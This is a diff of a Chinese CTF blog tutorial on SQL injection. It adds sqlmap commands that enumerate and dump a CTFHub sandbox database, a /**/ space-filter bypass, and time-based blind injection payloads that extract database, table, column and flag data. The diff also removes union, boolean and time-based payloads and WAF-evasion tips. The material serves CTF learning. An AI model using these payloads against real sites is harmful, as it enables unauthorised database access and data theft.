@@ -6,7 +6,7 @@ index_img: https://pic1.imgdb.cn/item/69189f3e3203f7be000915ab.png
 categories: CTF
 ---
 
-### 一、SQL 注入基础
+## 一、SQL 注入基础
 
 
 **核心原理**：用户输入未经过滤直接拼接到 SQL 语句中，导致恶意代码被执行。  
@@ -30,7 +30,7 @@ categories: CTF
 
 
 
-### 二、SQLmap 快速上手
+## 二、SQLmap 自动注入快速上手
 
 
 
@@ -55,10 +55,21 @@ categories: CTF
 |`--tamper`|使用脚本绕过 WAF（如 `space2comment` 替换空格为注释）|
 |`--threads`|多线程（默认 1，CTF 中建议 1-5 避免触发防护）|
 
+```shell
+python sqlmap.py -u http://challenge-07d7ae9cbbdb5f5e.sandbox.ctfhub.com:10800/?id=1 --current-db
 
-### 三、CTF 常见场景与 SQLmap 实操
+python sqlmap.py -u http://challenge-07d7ae9cbbdb5f5e.sandbox.ctfhub.com:10800/?id=1 -D sqli --tables
+
+python sqlmap.py -u http://challenge-07d7ae9cbbdb5f5e.sandbox.ctfhub.com:10800/?id=1 -D sqli -T flag --columns
+
+python sqlmap.py -u http://challenge-07d7ae9cbbdb5f5e.sandbox.ctfhub.com:10800/?id=1 -D sqli -T flag -C flag --dump
+```
+
+依次为查询最近使用的数据库，查询表，查询字段，转存数据
 
 
+
+### 常见场景
 
 #### 场景 1：GET 参数注入
 
@@ -66,11 +77,7 @@ categories: CTF
 
 **示例 URL**：`http://ctf.example.com/web1/?id=1`  
 
-
-
 **操作流程**：
-
-
 
 1. **检测注入点**：
 
@@ -201,37 +208,69 @@ python sqlmap.py -u "http://ctf.example.com/web5/?id=1" --tamper=gbkencode --dbs
 
 
 
-### 四、CTF 技巧
+### 参考文献
 
-1. **快速定位注入点**：
+[sqlmap常用命令整理](https://blog.csdn.net/qq_44005305/article/details/146025669)
 
-    - 先手动测试（如 `'`、`"`、`and 1=1`、`and 1=2`）判断是否存在注入。
+## 三、SQL语法
 
-    - 若手动难以判断，直接用 SQLmap 扫描。
+在 SQL 中，`SHOW COLUMNS FROM flag` 语句用于显示名为 `flag` 的表中各列的详细信息。它返回的结果通常是一个结果集，每行代表表中的一列，各列提供了关于该列的不同元数据信息。常见的格式如下：
 
-2. **绕过 WAF**：
+**列名**：显示各列信息的标题。通常包含以下常见列：
 
-    - 使用 `--tamper` 脚本（常见：`space2comment`、`unionalltounion`、`randomcase`）。
-
-    - 手动修改请求头（如 `X-Forwarded-For` 伪造 IP）。
-
-3. **优化 SQLmap 速度**：
-
-    - 时间盲注时减小 `--time-sec`（如 2 秒）。
-
-    - 合理使用 `--threads`（1-5 为宜）。
-
-    - 明确目标后直接指定数据库、表、字段，避免全量扫描。
-
-4. **手动注入辅助**：
-
-    - 当 SQLmap 无法自动化时，手动构造 payload：
-
-        - 联合查询：`id=1' union select 1,2,database()--`
-
-        - 布尔盲注：`id=1' and length(database())>5--`
-
-        - 时间盲注：`id=1' and sleep(5)--`
+- **Field**：列的名称。这是表中定义的列标识符。例如，如果表中有一个存储用户名的列，这里会显示相应的列名，如 `username`。
+- **Type**：列的数据类型。表明该列可以存储的数据类型，如 `INT`（整数类型）、`VARCHAR(255)`（可变长度字符串，最大长度为 255）、`DATE`（日期类型）等。
+- **Null**：表示该列是否允许存储 `NULL` 值。如果显示 `YES`，则该列可以接受 `NULL`；如果显示 `NO`，则不允许。
+- **Key**：显示该列是否被定义为键（如主键 `PRI`、唯一键 `UNI` 等）。如果是主键列，这里会显示 `PRI`。
+- **Default**：列的默认值。如果在创建表时为该列设置了默认值，这里会显示出来。例如，若某列默认值为 `0`，则会在此处显示 `0`。如果没有设置默认值，可能显示为 `NULL` 或空白（具体取决于数据库系统）。
+- **Extra**：提供关于该列的额外信息。例如，对于自增长列，这里可能显示 `auto_increment`。
 
 
 
+#### 过滤空格
+
+用`/**/` 代替
+
+
+
+## 四、手工注入
+
+[这可能是最全的SQL注入总结，不来看看吗](https://cloud.tencent.com/developer/article/1539207)
+
+#### 整数型注入
+
+[整数型SQL注入](https://blog.csdn.net/qq_69100706/article/details/140707246)
+
+[SQL注入——整数型注入、报错注入](https://blog.51cto.com/m0re/3867378)
+
+#### 时间盲注
+
+##### string 模块的常用常量
+
+| 常量名                   | 含义                               | 示例值                                               |
+| ------------------------ | ---------------------------------- | ---------------------------------------------------- |
+| `string.ascii_lowercase` | 26 个小写英文字母                  | abcdefghijklmnopqrstuvwxyz                           |
+| `string.ascii_uppercase` | 所有大写英文字母                   | ABCDEFGHIJKLMNOPQRSTUVWXYZ                           |
+| `string.digits`          | 所有数字                           | 0123456789                                           |
+| `string.ascii_letters`   | 所有大小写英文字母（结合上面两个） | abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ |
+| `string.punctuation`     | 所有标点符号                       | !"#$%&'()*+,-./:;<=>?@[]^_`{}~                       |
+
+**获取数据库长度**
+
+> ?id=1 and if(length(database())=4,sleep(5),1) --+
+
+**获取数据库名**
+
+> ?id=1 and if(substr(database(),1,1)='s',sleep(5),1) --+
+
+**获取表名**
+
+> ?id=1 and if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1)='c',sleep(5),1)--+
+
+**获取列名**
+
+> ?id=1 and if(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='sqli'),1,1)='a',sleep(5),1)--+
+
+**获取数据**
+
+> ?id=1 and if(substr((select group_concat(flag) from flag),1,1)='a',sleep(5),1)--+
